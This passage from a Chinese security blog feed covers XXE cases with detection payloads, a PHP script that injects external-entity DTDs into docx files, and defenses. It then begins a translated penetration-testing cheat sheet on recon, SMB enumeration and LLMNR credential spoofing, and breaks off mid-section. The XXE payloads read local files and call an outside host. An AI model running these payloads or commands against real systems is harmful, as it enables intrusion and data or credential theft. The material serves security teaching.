XML检查工具</li></ul></li><li>WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。</li><li>WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。</li><li>WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。</li><li>WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞  ）登陆与重置密码时使用XML传输数据。</li><li>WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。</li><li>WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 <code>content-type</code> 来区别对待提交的数据。<code>application/x-www-form-urlencoded</code> 、<code>application/json</code> 、<code>application/xml</code> 被用不同的方式解析。XML直接调用 <code>simplexml_load_string</code> 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。</li><li>WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 <code>关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。</code> ，我觉得有道理。<code>xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生</code> 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。</li><li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件<code>/home/run/ssh_go.sh</code> ，内含SSH登陆密码 orz。</li><li>一些其他案例<ul><li><a href="https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution" target="_blank" rel="noopener">XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook’s servers</a> 【Facebook OpenID功能点的XRDS XXE】<ul><li><a href="https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/" target="_blank" rel="noopener">Revisting XXE and abusing protocols</a> 的分析者利用该原理在其他OpenID平台结合expect模块实现了RCE。</li></ul></li><li><a href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745" target="_blank" rel="noopener">XXE on Windows system …then what ??</a> 【XXE+SMB=&gt;内网RCE】</li><li><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a> </li><li><a href="https://hackerone.com/reports/395296" target="_blank" rel="noopener">Phone Call to XXE via Interactive Voice Response</a> 【打个电话也能XXE :)】</li></ul></li></ul><h1 id="发现XXE"><a href="#发现XXE" class="headerlink" title="发现XXE"></a>发现XXE</h1><p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p><ul><li>单双引号 <code>&#39; &quot;</code> 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li><li>尖括号<code>&lt; &gt;</code>。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li><li>注释符 <code>&lt;!--</code> 。XML使用 <code>&lt;!-- This is a comment --&gt;</code>  作注释。</li><li><code>&amp;</code> 。&amp; 用于引用实体。</li><li>CDATA 分隔符<code>]]&gt;</code> 。<code>&lt;![CDATA[foo]]&gt;</code> 中的内容不被parser解析，提前闭合引发异常。</li></ul><p>尝试利用实体和DTD。</p><ul><li>引用外部DTD文件访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;</code> （看响应时间）</li><li>引用外部DTD文件访问外网。<code>&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;</code></li><li>引用内部实体。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li><li>外部实体读本地文件。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li><li>外部实体访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt;</code>（看响应时间）</li><li>外部实体访问外网。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code> </li><li>判断问题存在可以OOB提取数据。</li></ul><h1 id="生成恶意Word文档"><a href="#生成恶意Word文档" class="headerlink" title="生成恶意Word文档"></a>生成恶意Word文档</h1><p>上面提到的多个案例都需要用到自定义DTD的docx文件，有个名为 <a href="https://buer.haus/xxegen/" target="_blank" rel="noopener">XXEGen</a> 的在线网站可以方便地生成和监听（也可自定义监听地址），从而方便快速地测试XXE是否存在，但目前看来还不支持自定义DTD，如果需要用到OOB之类的技术，可能就不太方便。</p><p>所以我写了个小脚本，可以用来生成一个正常docx文件，然后注入自定义的DTD和实体引用。另外新版的word软件默认禁用DTD，trigger 函数还可以本地测试下word文件是否有问题。</p><p>其实修改 docx 文件的原理很简单，手动也可以做。解压 demo.docx 到 demo文件夹 ，直接修改 <code>demo/word/document.xml</code>  文件内容，全选 demo 文件夹中的文件，使用 7zip 的仅存储方式压缩成 demo2.docx 即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// by https://github.com/findneo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genword</span><span class="params">($filename,$filecontent)</span></span>&#123;</span><br><span class="line">    $word = <span class="keyword">new</span> COM(<span class="string">"word.application"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to instantiate Word"</span>);</span><br><span class="line">    $word-&gt;Visible = <span class="number">0</span>;<span class="comment">//保持程序在后台运行</span></span><br><span class="line">    $word-&gt;Documents-&gt;Add();<span class="comment">//新建Word文档</span></span><br><span class="line">    $word-&gt;Selection-&gt;TypeText($filecontent);<span class="comment">//写入指定内容</span></span><br><span class="line">    $word-&gt;Documents[<span class="number">1</span>]-&gt;SaveAs(getcwd().<span class="string">"/"</span>.$filename);<span class="comment">//保存到指定路径</span></span><br><span class="line">    $word-&gt;Quit();<span class="comment">//退出程序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poisonWord</span><span class="params">($filename,$flag,$dtd,$entity_reference)</span> </span>&#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    $zip-&gt;open($filename);</span><br><span class="line">    $xml=$zip-&gt;getFromName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $prolog=<span class="string">'&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;'</span>;</span><br><span class="line">    $evilxml=str_replace([$prolog,$flag],[$prolog.$dtd,$flag.$entity_reference],$xml);<span class="comment">//构造恶意XML</span></span><br><span class="line">    $zip-&gt;deleteName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $zip-&gt;addFromString(<span class="string">"word/document.xml"</span>,$evilxml);<span class="comment">//更新docx文件</span></span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    $zip-&gt;open($filename);</span><br><span class="line">    $xml=$zip-&gt;getFromName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $doc_xml = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $doc_xml-&gt;loadXML($xml); <span class="comment">//加载word文档</span></span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    <span class="keyword">return</span> $doc_xml-&gt;textContent; <span class="comment">//读取文档内容</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这里定义想要添加的DTD内容和想要在XML中引用的实体</span></span><br><span class="line">$dtd=<span class="string">'&lt;!DOCTYPE ANY [&lt;!ENTITY xxe  SYSTEM "http://127.0.0.1:8088/?findneo"&gt;&lt;!ENTITY int "XXE"&gt;]&gt;'</span>;</span><br><span class="line">$entity_reference=<span class="string">"&amp;xxe; &amp;int; IS EXCITING!"</span>;</span><br><span class="line"></span><br><span class="line">$name=<span class="string">"demo.docx"</span>;<span class="comment">//生成文件的文件名</span></span><br><span class="line">$flag=<span class="string">"Across the Great Wall we can reach every corner in the world."</span>;<span class="comment">//文件内容，实体在该内容附近引用。</span></span><br><span class="line">genWord($name,$flag);<span class="comment">//生成一个指定内容和文件名的正常docx文件</span></span><br><span class="line">poisonWord($name,$flag,$dtd,$entity_reference);<span class="comment">//向正常文件注入DTD和实体引用，生成恶意文件</span></span><br><span class="line"><span class="keyword">echo</span> trigger($name);<span class="comment">//加载文件，测试效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径</span></span><br><span class="line"><span class="comment">//extension="php_com_dotnet.dll 路径"; extension="php_mbstring.dll 路径"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此外，Github项目 <a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener"><strong>oxml_xxe</strong></a>  支持更多文件类型。 </p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>彻底禁用DTD是最好的，退一步，禁用外部实体/外部DTD也可以。具体参考 <a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet" target="_blank" rel="noopener">XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a> 。</p><ul><li>禁用外部实体 ( <a href="http://cn2.php.net/libxml_disable_entity_loader" target="_blank" rel="noopener">http://cn2.php.net/libxml_disable_entity_loader</a> 等)<ul><li>对于PHP来说，尽管不同环境下<code>simplexml_load_string()</code> 默认行为并不一致，但为了安全应当总是<code>libxml_disable_entity_loader();</code> 。 </li></ul></li><li>检验数据来源，过滤数据</li></ul><p>PHP及其他语言或框架，是否默认解析外部实体，解析方式和在特定场景下的解析表现，与其使用的 libxml2 版本有关（如果是基于libxml2的话），也与XML解析器及其配置有关。就PHP而言，<code>libxml2 Version</code> 可以在phpinfo里看，本文使用的是<code>2.7.8</code> 。</p><p>这可能是一个误解的结果。</p><blockquote><p>在slimphp2中，官方是对这块进行一定处理了（。。。一些代码。。。）不知为何在3.0版本中官方就无视这个问题了。 我猜可能有两个原因： </p><p>1.官方注意到了这个问题，但认为3.0版本需求的php版本在5.5以上，而错以为5.5以上的php就已经不存在XXE的隐患了。但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。</p><p>2.官方尚未注意到这个问题。</p><p>感觉前者的可能性较大。  </p><p>—— wooyun-2015-0156208</p></blockquote><p>可以结合 <a href="http://www.xmlsoft.org/news.html" target="_blank" rel="noopener">change log</a> 和 <a href="https://github.com/GNOME/libxml2/commits" target="_blank" rel="noopener">GitHub commit</a> 了解 libxml2 各版本具体改动。</p><p>可以看到与主题较相关的有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v2<span class="number">.9</span><span class="number">.5</span>: Sep <span class="number">04</span> <span class="number">2017</span></span><br><span class="line">    Security:Detect infinite recursion in parameter entities (Nick Wellnhofer)</span><br><span class="line">    Prevent unwanted external entity reference</span><br><span class="line">v2<span class="number">.9</span><span class="number">.2</span>: Oct <span class="number">16</span> <span class="number">2014</span></span><br><span class="line">    Security:</span><br><span class="line">Fix <span class="keyword">for</span> CVE<span class="number">-2014</span><span class="number">-3660</span> billion laugh variant (Daniel Veillard),</span><br><span class="line">CVE<span class="number">-2014</span><span class="number">-0191</span> <span class="keyword">Do</span> not fetch external parameter entities (Daniel Veillard)</span><br><span class="line"><span class="number">2.9</span><span class="number">.1</span>: Apr <span class="number">19</span> <span class="number">2013</span></span><br><span class="line">    Activate detection of encoding in external subset</span><br><span class="line"><span class="number">2.9</span><span class="number">.0</span>: Sep <span class="number">11</span> <span class="number">2012</span></span><br><span class="line">    <span class="keyword">Do</span> not fetch external parsed entities</span><br></pre></td></tr></table></figure><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><ul><li><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf" target="_blank" rel="noopener">XML Out-Of-Band Data Retrieval</a>  </li><li><a href="https://www.vsecurity.com//download/publications/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">XMLDTDEntityAttacks.pdf</a> </li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="noopener">XML External Entity (XXE) Processing</a>_Processing) </li><li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a> </li><li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">DTD Cheat Sheet</a> </li><li><a href="https://www.tutorialspoint.com/dtd/dtd_syntax.htm" target="_blank" rel="noopener">DTD - Syntax</a> </li><li><a href="https://phonexicum.github.io/infosec/xxe.html" target="_blank" rel="noopener">Information Security / infosec / XXE</a> </li><li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="noopener">XXE_payloads</a> </li><li><a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank" rel="noopener">DTD Tutorial</a> </li><li><a href="https://www.w3.org/TR/xml/" target="_blank" rel="noopener">Extensible Markup Language (XML) 1.0 (Fifth Edition)</a> </li><li><a href="https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110" target="_blank" rel="noopener">about XML entity at msdn</a>.aspx)  </li><li>Spring MVC xml绑定pojo造成的XXE （乌云papers-1911）</li><li>Oracle盲注结合XXE漏洞远程获取数据（乌云papers-6035）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;本文发自 &lt;a href=&quot;https://xz.aliyun.com/t/2571&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;先知社区&lt;/a&gt; ，转载请注明出处。&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;（ 这个问题资料很多了，细节也颇多，
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【译】渗透测试工具备忘录</title>
    <link href="https://findneo.github.io/180727PenetrationTool/"/>
    <id>https://findneo.github.io/180727PenetrationTool/</id>
    <published>2018-07-25T07:01:56.000Z</published>
    <updated>2019-01-25T23:21:37.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试工具备忘录"><a href="#渗透测试工具备忘录" class="headerlink" title="渗透测试工具备忘录"></a>渗透测试工具备忘录</h1><p><strong>本文翻译自 <a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="noopener">Penetration Testing Tools Cheat Sheet </a> ，首发<a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 <a href="https://highon.coffee/blog/" target="_blank" rel="noopener">本站</a> 其他备忘录。</p><p>本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。</p><p>文中缺漏之处欢迎 <a href="https://twitter.com/Arr0way" target="_blank" rel="noopener">推特</a> 私戳。</p><h3 id="更新日志："><a href="#更新日志：" class="headerlink" title="更新日志："></a>更新日志：</h3><p>17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。</p><h2 id="开始前"><a href="#开始前" class="headerlink" title="开始前"></a>开始前</h2><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><h4 id="设置IP-地址"><a href="#设置IP-地址" class="headerlink" title="设置IP 地址"></a>设置IP 地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 xxx.xxx.xxx.xxx/24</span><br></pre></td></tr></table></figure><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipcalc xxx.xxx.xxx.xxx/24 </span><br><span class="line">ipcalc xxx.xxx.xxx.xxx 255.255.255.0</span><br></pre></td></tr></table></figure><h2 id="公开来源情报"><a href="#公开来源情报" class="headerlink" title="公开来源情报"></a>公开来源情报</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><h5 id="WHOIS-枚举"><a href="#WHOIS-枚举" class="headerlink" title="WHOIS 枚举"></a>WHOIS 枚举</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois domain-name-here.com</span><br></pre></td></tr></table></figure><h5 id="查询DNS-IP"><a href="#查询DNS-IP" class="headerlink" title="查询DNS IP"></a>查询DNS IP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig a domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h5 id="查询MX记录"><a href="#查询MX记录" class="headerlink" title="查询MX记录"></a>查询MX记录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig mx domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h5 id="用DIG-查询域传送"><a href="#用DIG-查询域传送" class="headerlink" title="用DIG 查询域传送"></a>用DIG 查询域传送</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h2 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></td><td>Windows DNS域传送</td></tr><tr><td><code>dig axfr blah.com @ns1.blah.com</code></td><td>Linux DNS 域传送</td></tr></tbody></table><h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><h4 id="Simply-Email"><a href="#Simply-Email" class="headerlink" title="Simply Email"></a>Simply Email</h4><p>使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/killswitch-GUI/SimplyEmail.git</span><br><span class="line">./SimplyEmail.py -all -e TARGET-DOMAIN</span><br></pre></td></tr></table></figure><h3 id="半主动信息收集"><a href="#半主动信息收集" class="headerlink" title="半主动信息收集"></a>半主动信息收集</h3><h4 id="基本指纹识别"><a href="#基本指纹识别" class="headerlink" title="基本指纹识别"></a>基本指纹识别</h4><p>手动指纹识别/banner抓取</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nc -v 192.168.1.1 25</code> <br><code>telnet 192.168.1.1 25</code></td><td>通过显示banner识别版本和指纹</td></tr></tbody></table><h4 id="使用NC抓取banner"><a href="#使用NC抓取banner" class="headerlink" title="使用NC抓取banner"></a>使用NC抓取banner</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc TARGET-IP 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: TARGET-IP</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Referrer: meh-domain</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="DNS-爆破"><a href="#DNS-爆破" class="headerlink" title="DNS 爆破"></a>DNS 爆破</h4><h5 id="DNSRecon"><a href="#DNSRecon" class="headerlink" title="DNSRecon"></a>DNSRecon</h5><table><thead><tr><th>DNS Enumeration Kali - DNSRecon</th></tr></thead><tbody><tr><td>root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std –xml ouput.xml</td></tr></tbody></table><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="Nmap命令"><a href="#Nmap命令" class="headerlink" title="Nmap命令"></a>Nmap命令</h5><p>更多命令，详见 <a href="https://highon.coffee/blog/nmap-cheat-sheet/" target="_blank" rel="noopener">Nmap备忘录</a> 。</p><p>基本Nmap 命令：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nmap -v -sS -A -T4 target</code></td><td>详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪</td></tr><tr><td><code>nmap -v -sS -p--A -T4 target</code></td><td>同上，且扫描所有TCP端口，耗时更长</td></tr><tr><td><code>nmap -v -sU -sS -p- -A -T4 target</code></td><td>同上，且扫描所有UDP端口，耗时巨长</td></tr><tr><td><code>nmap -v -p 445 --script=smb-check-vulns  --script-args=unsafe=1 192.168.1.X</code></td><td>扫描可能包含漏洞的SMB服务</td></tr><tr><td>` ls /usr/share/nmap/scripts/*</td><td>grep ftp `</td><td>利用关键字搜索nmap脚本</td></tr></tbody></table><p>别在外网采用<code>T4</code> 扫描，使用<code>TCP</code> 连接扫描时用<code>T2</code> 比较合适。<code>T4</code> 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用<code>T4/T5</code> 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。</p><h6 id="Nmap-UDP扫描"><a href="#Nmap-UDP扫描" class="headerlink" title="Nmap UDP扫描"></a>Nmap UDP扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU TARGET</span><br></pre></td></tr></table></figure><h6 id="UDP-协议扫描器"><a href="#UDP-协议扫描器" class="headerlink" title="UDP 协议扫描器"></a>UDP 协议扫描器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/portcullislabs/udp-proto-scanner.git</span><br></pre></td></tr></table></figure><p>扫描文件中IP地址的所有服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -f ip.txt</span><br></pre></td></tr></table></figure><p>扫描特定UDP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udp-proto-scanner.pl -p ntp -f ips.txt</span><br></pre></td></tr></table></figure><h6 id="其他主机发现"><a href="#其他主机发现" class="headerlink" title="其他主机发现"></a>其他主机发现</h6><p>不使用nmap发现主机的方法：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>netdiscover -r 192.168.1.0/24</code></td><td>利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商</td></tr></tbody></table><h2 id="枚举和攻击网络服务"><a href="#枚举和攻击网络服务" class="headerlink" title="枚举和攻击网络服务"></a>枚举和攻击网络服务</h2><p>用于识别/枚举网络服务的工具。</p><h3 id="SAMB-SMB-Windows-域枚举"><a href="#SAMB-SMB-Windows-域枚举" class="headerlink" title="SAMB / SMB / Windows 域枚举"></a>SAMB / SMB / Windows 域枚举</h3><h4 id="Samba枚举"><a href="#Samba枚举" class="headerlink" title="Samba枚举"></a>Samba枚举</h4><h5 id="SMB枚举工具"><a href="#SMB枚举工具" class="headerlink" title="SMB枚举工具"></a>SMB枚举工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure><p>当然也可参考本站的 <a href="https://highon.coffee/blog/nbtscan-cheat-sheet/" target="_blank" rel="noopener">nbtscan 的速查表</a> </p><h5 id="SMB-版本指纹识别"><a href="#SMB-版本指纹识别" class="headerlink" title="SMB 版本指纹识别"></a>SMB 版本指纹识别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.1.100</span><br></pre></td></tr></table></figure><h5 id="寻找开放的SMB共享"><a href="#寻找开放的SMB共享" class="headerlink" title="寻找开放的SMB共享"></a>寻找开放的SMB共享</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24</span><br></pre></td></tr></table></figure><h5 id="枚举SMB用户"><a href="#枚举SMB用户" class="headerlink" title="枚举SMB用户"></a>枚举SMB用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</span><br></pre></td></tr></table></figure><p>RID循环（RID Cycling ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</span><br></pre></td></tr></table></figure><p>Metasploit的RID循环攻击模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure><h6 id="手动测试空会话"><a href="#手动测试空会话" class="headerlink" title="手动测试空会话"></a>手动测试空会话</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">net use \\TARGET\IPC$ &quot;&quot; /u:&quot;&quot;</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">smbclient -L //192.168.99.131</span><br></pre></td></tr></table></figure><h6 id="NBTScan-unixwiz"><a href="#NBTScan-unixwiz" class="headerlink" title="NBTScan unixwiz"></a>NBTScan unixwiz</h6><p>在Kali上安装使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nbtscan-unixwiz </span><br><span class="line">nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan</span><br></pre></td></tr></table></figure><h4 id="LLMNR-NBT-NS欺骗"><a href="#LLMNR-NBT-NS欺骗" class="headerlink" title="LLMNR / NBT-NS欺骗"></a>LLMNR / NBT-NS欺骗</h4><p>从网络中窃取凭证</p><h5 id="使用Metasploit进行-LLMNR-NetBIOS请求"><a href="#使用Metasploit进行-LLMNR-NetBIOS请求" class="headerlink" title="使用Metasploit进行 LLMNR / NetBIOS请求"></a>使用Metasploit进行 LLMNR / NetBIOS请求</h5><p>欺骗/毒化 LLMNR / NetBIOS请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/spoof/llmnr/llmnr_response</span><br><span 